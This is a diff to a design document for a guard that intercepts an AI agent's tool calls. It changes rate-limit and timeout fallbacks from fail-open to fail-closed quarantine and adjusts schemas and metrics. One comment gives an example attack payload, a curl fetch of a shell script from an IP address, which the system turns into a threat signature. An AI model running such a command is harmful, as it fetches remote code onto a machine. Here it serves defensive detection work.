@@ -147,10 +147,11 @@ sequenceDiagram
 **Purpose**: Thread-safe FIFO queue that holds suspended ADK tool callbacks during batch accumulation, preventing deadlocks while managing asynchronous callback resolution.
 
 **Interface**:
+
 ```pascal
 INTERFACE InterceptionQueue
   enqueue(callbackToken: CallbackToken, toolCall: ToolCallContext): QueuePosition
-  dequeue(): CallbackToken
+  dequeue(timeoutMs: Integer): CallbackToken
   getBatch(maxSize: Integer, maxWaitMs: Integer): Array<CallbackToken>
   resolveCallbacks(verdicts: Array<Verdict>): Boolean
   size(): Integer
@@ -162,6 +163,7 @@ STRUCTURE CallbackToken
   timestamp: Timestamp
   toolName: String
   arguments: Map<String, Any>
+  toolCallContext: ToolCallContext
   resumeCallback: Function<Verdict, Result>
 END STRUCTURE
 
@@ -172,6 +174,8 @@ STRUCTURE ToolCallContext
   sanitizedArguments: Map<String, Any>
   environmentRole: String
   stackTrace: Array<String>
+  targetFunction: String or Null  // Optional: target code function name for CBM dependency-chain lookup
+  metadata: Map<String, Any> or Null  // Populated by Context Hygiene: originalHash, redactionCount, redactionLog
 END STRUCTURE
 
 STRUCTURE Verdict
@@ -255,6 +259,8 @@ END STRUCTURE
 **Interface**:
 ```pascal
 INTERFACE HybridPolicyServer
+  evaluateBatch(batchPayload: BatchPayload): Array<Verdict>
+  getCurrentState(): PolicyServerState
   evaluate(context: ToolCallContext): Verdict
   structuralGate(context: ToolCallContext): GateResult
   semanticGate(context: ToolCallContext): GateResult
@@ -366,11 +372,14 @@ STRUCTURE SecurityEvent
   eventId: UUID
   timestamp: Timestamp
   agentId: String
+  eventType: Enum<INTERCEPTION, BLOCK, ALLOW, QUARANTINE, SIGNATURE_CREATED>
   toolCall: ToolCallContext
   verdict: Verdict
   gtiResponse: GTIResponse or Null
   cbmResponse: CBMResponse or Null
   relatedSignatures: Array<UUID>
+  behaviorScore: BehaviorScore or Null
+  telemetrySpanId: String
 END STRUCTURE
 
 STRUCTURE BehaviorScore
@@ -434,7 +443,7 @@ END INTERFACE
 STRUCTURE ThreatSignature
   signatureId: UUID
   createdAt: Timestamp
-  lastMatchedAt: Timestamp
+  lastMatchedAt: Timestamp or Null
   attackerIntent: String
   payloadPattern: String
   targetTool: String
@@ -444,6 +453,7 @@ STRUCTURE ThreatSignature
   matchCount: Integer
   falsePositiveCount: Integer
   similarityVector: Array<Float>
+  metadata: Map<String, Any>
 END STRUCTURE
 
 STRUCTURE GraphStatistics
@@ -480,9 +490,12 @@ CREATE TABLE signatures (
   match_count INTEGER DEFAULT 0,
   false_positive_count INTEGER DEFAULT 0,
   similarity_vector BLOB, -- Serialized float array
-  INDEX idx_tool (target_tool),
-  INDEX idx_last_matched (last_matched_at)
+  metadata TEXT -- JSON serialized Map<String, Any>
 );
+
+-- Indexes for signatures table
+CREATE INDEX idx_tool ON signatures(target_tool);
+CREATE INDEX idx_last_matched ON signatures(last_matched_at);
 
 -- Edges Table
 CREATE TABLE signature_relationships (
@@ -492,11 +505,13 @@ CREATE TABLE signature_relationships (
   relationship_type TEXT NOT NULL, -- SIMILAR_TO, MITIGATED_BY
   weight REAL NOT NULL,
   created_at INTEGER NOT NULL,
-  FOREIGN KEY (source_signature_id) REFERENCES signatures(signature_id),
-  FOREIGN KEY (target_signature_id) REFERENCES signatures(signature_id),
-  INDEX idx_source (source_signature_id),
-  INDEX idx_type (relationship_type)
+  FOREIGN KEY (source_signature_id) REFERENCES signatures(signature_id) ON DELETE CASCADE,
+  FOREIGN KEY (target_signature_id) REFERENCES signatures(signature_id) ON DELETE CASCADE
 );
+
+-- Indexes for signature_relationships table
+CREATE INDEX idx_source ON signature_relationships(source_signature_id);
+CREATE INDEX idx_type ON signature_relationships(relationship_type);
 
 -- Access Pattern: Full-Text Search on patterns
 CREATE VIRTUAL TABLE signature_fts USING fts5(
@@ -652,6 +667,20 @@ END STRUCTURE
 
 ### Model 2: SecurityEvent
 
+```pascal
+STRUCTURE SecurityEvent
+  eventId: UUID
+  timestamp: Timestamp
+  agentId: String
+  eventType: Enum<INTERCEPTION, BLOCK, ALLOW, QUARANTINE, SIGNATURE_CREATED>
+  toolCall: ToolCallContext
+  verdict: Verdict
+  gtiResponse: GTIResponse or Null
+  cbmResponse: CBMResponse or Null
+  relatedSignatures: Array<UUID>
+  behaviorScore: BehaviorScore or Null
+  telemetrySpanId: String
+END STRUCTURE
 ```
 
 **Validation Rules**:
@@ -699,17 +728,19 @@ END STRUCTURE
 ### Algorithm 1: Asynchronous Batch Resolver with Callback Queue Management
 
 ```pascal
-ALGORITHM processBatchWithTimeout(interceptionQueue, maxBatchSize, maxWaitMs, geminiClient)
+ALGORITHM processBatchWithTimeout(interceptionQueue, maxBatchSize, maxWaitMs, contextHygiene, policyServer)
 INPUT: 
   interceptionQueue: InterceptionQueue (thread-safe queue)
   maxBatchSize: Integer (default 5)
   maxWaitMs: Integer (default 100)
-  geminiClient: GeminiAPIClient
+  contextHygiene: ContextHygiene
+  policyServer: HybridPolicyServer
 OUTPUT: None (side effect: resume callbacks)
 
 PRECONDITIONS:
   - interceptionQueue is initialized and thread-safe
-  - geminiClient has valid API credentials
+  - contextHygiene is initialized with redaction patterns
+  - policyServer has loaded policy rules
   - maxBatchSize > 0 AND maxWaitMs > 0
 
 BEGIN
@@ -752,14 +783,14 @@ BEGIN
     TRY
       verdicts ← policyServer.evaluateBatch(batchPayload)
     CATCH APIRateLimitException
-      // Emergency fallback: mark all as ALLOW with warning
+      // Emergency fallback: fail closed — deny all with QUARANTINE pending re-evaluation
       verdicts ← batch.map(token => Verdict{
-        decision: ALLOW,
-        reason: "Rate limit exceeded - default allow",
-        threatScore: 0.5,
-        suggestedAction: "REVIEW_LATER"
+        decision: QUARANTINE,
+        reason: "Rate limit exceeded - conservative deny pending re-evaluation",
+        threatScore: 0.9,
+        suggestedAction: "RETRY_AFTER_BACKOFF"
       })
-      logWarning("API rate limit hit, falling back to default allow")
+      logWarning("API rate limit hit, failing closed with QUARANTINE verdicts")
     END TRY
     
     // Phase 4: Map Verdicts Back to Callbacks
@@ -920,10 +951,10 @@ LOOP INVARIANTS:
 ### Algorithm 3: Threat Signature Generation from Blocked Events
 
 ```pascal
-ALGORITHM generateThreatSignature(securityEvent, cbmClient, embeddingModel)
+ALGORITHM generateThreatSignature(securityEvent, policyServer, embeddingModel)
 INPUT:
   securityEvent: SecurityEvent (must have verdict.decision = BLOCK)
-  cbmClient: CodebaseMemoryClient
+  policyServer: HybridPolicyServer
   embeddingModel: EmbeddingFunction
 OUTPUT: signature: ThreatSignature
 
@@ -933,25 +964,26 @@ PRECONDITIONS:
   - embeddingModel is initialized
 
 BEGIN
-  // Step 1: Extract attacker intent using LLM analysis
-  attackerIntent ← semanticGate.inferIntent(securityEvent.toolCall)
+  // Step 1: Extract attacker intent via the semantic gate using the existing tool call context
+  semanticResult ← policyServer.semanticGate(securityEvent.toolCall)
+  attackerIntent ← semanticResult.reason  // reason field carries the LLM-derived intent summary
   
   // Step 2: Generalize payload pattern (remove specific values)
-  rawPayload ← securityEvent.toolCall.arguments
-  payloadPattern ← generalize
-Payload(rawPayload)
+  // Serialize rawArguments map to JSON string so regex patterns can operate on it
+  rawPayload ← toJSONString(securityEvent.toolCall.rawArguments)
+  payloadPattern ← generalizePayload(rawPayload)
   
   // Example: "curl http://192.168.1.100/shell.sh" → "curl http://[[IP_ADDRESS]]/[[SCRIPT_NAME]]"
   
-  // Step 3: Query dependency chain if function target exists
+  // Step 3: Extract dependency chain from cbmResponse already on the SecurityEvent
+  // (cbmResponse was populated upstream by HybridPolicyServer during evaluation)
   dependencyChain ← EMPTY_ARRAY
   targetSink ← NULL
   
-  IF securityEvent.toolCall.targetFunction IS NOT NULL THEN
-    depChainResult ← cbmClient.queryDependencyChain(securityEvent.toolCall.targetFunction)
-    dependencyChain ← depChainResult.callChain
-    IF depChainResult.hasCriticalSink THEN
-      targetSink ← depChainResult.criticalSinks[0]
+  IF securityEvent.cbmResponse IS NOT NULL THEN
+    dependencyChain ← securityEvent.cbmResponse.callChain
+    IF securityEvent.cbmResponse.hasCriticalSink THEN
+      targetSink ← securityEvent.cbmResponse.criticalSinks[0]
     END IF
   END IF
   
@@ -1064,7 +1096,8 @@ BEGIN
       mitigation_action TEXT NOT NULL,
       match_count INTEGER DEFAULT 0,
       false_positive_count INTEGER DEFAULT 0,
-      similarity_vector BLOB
+      similarity_vector BLOB,
+      metadata TEXT -- JSON serialized Map<String, Any>
     );
   ")
   
@@ -1084,8 +1117,8 @@ BEGIN
       relationship_type TEXT NOT NULL,
       weight REAL NOT NULL,
       created_at INTEGER NOT NULL,
-      FOREIGN KEY (source_signature_id) REFERENCES signatures(signature_id),
-      FOREIGN KEY (target_signature_id) REFERENCES signatures(signature_id)
+      FOREIGN KEY (source_signature_id) REFERENCES signatures(signature_id) ON DELETE CASCADE,
+      FOREIGN KEY (target_signature_id) REFERENCES signatures(signature_id) ON DELETE CASCADE
     );
   ")
   
@@ -1237,13 +1270,26 @@ OUTPUT: metrics: SecurityMetrics
 PRECONDITIONS:
   - testResults.size() = groundTruth.size()
   - All labels are either MALICIOUS or BENIGN
-  - All verdicts are either BLOCK or ALLOW
+  - All verdicts are BLOCK, ALLOW, or QUARANTINE
 
 BEGIN
-  truePositives ← 0    // Correctly blocked malicious
-  trueNegatives ← 0    // Correctly allowed benign
-  falsePositives ← 0   // Incorrectly blocked benign (FRR)
-  falseNegatives ← 0   // Incorrectly allowed malicious (Evasion)
+  // Empty-suite guard: return zero metrics without dividing by zero
+  IF testResults.size() = 0 THEN
+    RETURN SecurityMetrics{
+      truePositives: 0, trueNegatives: 0,
+      falsePositives: 0, falseNegatives: 0,
+      quarantineCount: 0,
+      falseRefusalRate: 0.0, evasionRate: 0.0,
+      accuracy: 0.0, precision: 0.0, recall: 0.0, f1Score: 0.0,
+      totalTests: 0
+    }
+  END IF
+
+  truePositives ← 0    // Correctly stopped malicious (BLOCK or QUARANTINE)
+  trueNegatives ← 0    // Correctly allowed benign (ALLOW)
+  falsePositives ← 0   // Incorrectly stopped benign (BLOCK or QUARANTINE → FRR)
+  falseNegatives ← 0   // Incorrectly allowed malicious (ALLOW → Evasion)
+  quarantineCount ← 0  // Total QUARANTINE verdicts (informational bucket)
   
   FOR i FROM 0 TO testResults.size() - 1 DO
     result ← testResults[i]
@@ -1251,10 +1297,18 @@ BEGIN
     
     IF truth.label = MALICIOUS AND result.verdict.decision = BLOCK THEN
       truePositives ← truePositives + 1
+    ELSE IF truth.label = MALICIOUS AND result.verdict.decision = QUARANTINE THEN
+      // QUARANTINE on malicious = correct interception (conservative stop)
+      truePositives ← truePositives + 1
+      quarantineCount ← quarantineCount + 1
     ELSE IF truth.label = BENIGN AND result.verdict.decision = ALLOW THEN
       trueNegatives ← trueNegatives + 1
     ELSE IF truth.label = BENIGN AND result.verdict.decision = BLOCK THEN
       falsePositives ← falsePositives + 1
+    ELSE IF truth.label = BENIGN AND result.verdict.decision = QUARANTINE THEN
+      // QUARANTINE on benign = incorrectly stopped (counts against FRR)
+      falsePositives ← falsePositives + 1
+      quarantineCount ← quarantineCount + 1
     ELSE IF truth.label = MALICIOUS AND result.verdict.decision = ALLOW THEN
       falseNegatives ← falseNegatives + 1
     END IF
@@ -1264,7 +1318,7 @@ BEGIN
   totalBenign ← trueNegatives + falsePositives
   
   // False Refusal Rate (False Positive Rate)
-  // Percentage of benign actions incorrectly blocked
+  // Percentage of benign actions incorrectly stopped (BLOCK or QUARANTINE)
   IF totalBenign > 0 THEN
     frr ← (falsePositives / totalBenign) * 100.0
   ELSE
@@ -1279,7 +1333,7 @@ BEGIN
     evasionRate ← 0.0
   END IF
   
-  // Overall Accuracy
+  // Overall Accuracy (safe: empty suite already handled above)
   accuracy ← ((truePositives + trueNegatives) / testResults.size()) * 100.0
   
   // Precision (Positive Predictive Value)
@@ -1308,6 +1362,7 @@ BEGIN
     trueNegatives: trueNegatives,
     falsePositives: falsePositives,
     falseNegatives: falseNegatives,
+    quarantineCount: quarantineCount,
     falseRefusalRate: frr,
     evasionRate: evasionRate,
     accuracy: accuracy,
@@ -1325,6 +1380,7 @@ POSTCONDITIONS:
   - metrics.evasionRate < 10.0 (target requirement)
   - All percentage values are in range [0.0, 100.0]
   - truePositives + trueNegatives + falsePositives + falseNegatives = totalTests
+  - If totalTests = 0, all fields are 0 (no divide-by-zero)
 
 STRUCTURE TestResult
   testId: String
@@ -1344,6 +1400,7 @@ STRUCTURE SecurityMetrics
   trueNegatives: Integer
   falsePositives: Integer
   falseNegatives: Integer
+  quarantineCount: Integer
   falseRefusalRate: Float
   evasionRate: Float
   accuracy: Float
@@ -1368,12 +1425,12 @@ FUNCTION writeSignatureToGraph(tsgClient, signature)
 
 **Preconditions:**
 - `tsgClient` is initialized with valid database connection
-- `signature.signatureId` is unique (not already in database)
+- `signature.signatureId` should be unique (advisory check; database PRIMARY KEY enforces this atomically)
 - `signature.similarityVector` has consistent dimensionality
 - `signature.attackerIntent` is non-empty string
 
 **Postconditions:**
-- Signature is persisted in SQLite `signatures` table
+- Signature is persisted in SQLite `signatures` table via INSERT OR IGNORE; duplicate signature_id is silently dropped (no error)
 - FTS5 index is updated with `payloadPattern` and `attackerIntent`
 - If similar signatures exist (cosine similarity > 0.85), SIMILAR_TO edges are created
 - Returns `true` if write succeeds, `false` otherwise
@@ -1428,7 +1485,7 @@ FUNCTION evaluateBatchWithRateLimit(policyServer, batchPayload, rateLimiter)
 - Returns verdict array with size = `batchPayload.contexts.size()`
 - Verdict array indices match input context array indices
 - If rate limit exceeded, applies exponential backoff (max 3 retries)
-- If all retries fail, returns default ALLOW verdicts with warning logged
+- If all retries fail, returns QUARANTINE verdicts with warning logged (fail closed)
 - All security events are logged asynchronously (non-blocking)
 - API token consumption is tracked and logged
 
@@ -1572,7 +1629,10 @@ securityEvent ← SecurityEvent{
   toolCall: toolContext,
   verdict: verdict,
   gtiResponse: gtiResponse,
-  cbmResponse: NULL
+  cbmResponse: NULL,
+  relatedSignatures: [],
+  behaviorScore: NULL,
+  telemetrySpanId: generateTraceId()
 }
 
 signature ← abaEngine.generateSignature(securityEvent)
@@ -1691,7 +1751,7 @@ result ← ADK.executeToolCall(toolName: "read_file", arguments: {...})
    - ∀ batch ∈ BatchResolver: |verdicts| = |batch.contexts| ∧ ∀i: verdicts[i] corresponds to contexts[i]
 
 2. **Threat Score Bounded**
-   - ∀ context ∈ ToolCallContext: computeThreatScore(context) ∈ [0.0, 1.0]
+   - ∀ gtiResponses ∈ Array<GTIResponse>, cbmResponse ∈ (CBMResponse or Null), context ∈ ToolCallContext: computeThreatScore(gtiResponses, cbmResponse, context) ∈ [0.0, 1.0]
    - ∀ verdict ∈ Verdict: (verdict.decision = BLOCK ⟹ verdict.threatScore >= 0.75) ∧
                           (verdict.decision = QUARANTINE ⟹ verdict.threatScore >= 0.5)
 
@@ -1949,7 +2009,7 @@ result ← ADK.executeToolCall(toolName: "read_file", arguments: {...})
 
 **Recovery**:
 - All callbacks are guaranteed resolution within maxWaitMs + evaluation time
-- If evaluation hangs (>10 seconds), emergency fallback returns ALLOW verdicts with warnings
+- If evaluation hangs (>10 seconds), emergency fallback returns QUARANTINE verdicts with warnings (fail closed)
 - Thread watchdog timer kills frozen evaluation threads after 30 seconds
 - System auto-restarts evaluation pipeline on watchdog trigger
 
@@ -1981,7 +2041,7 @@ result ← ADK.executeToolCall(toolName: "read_file", arguments: {...})
 - Rate limiter tracks sliding window of API calls
 - When limit is reached, queue additional batches (max queue depth: 20 batches)
 - Apply exponential backoff: 100ms, 200ms, 400ms, 800ms delays
-- If queue overflows, apply "fail open" policy: ALLOW with elevated monitoring
+- If queue overflows, apply fail-closed policy: QUARANTINE with elevated monitoring
 
 **Recovery**:
 - As rate limit window refreshes (60 seconds), queued batches are processed
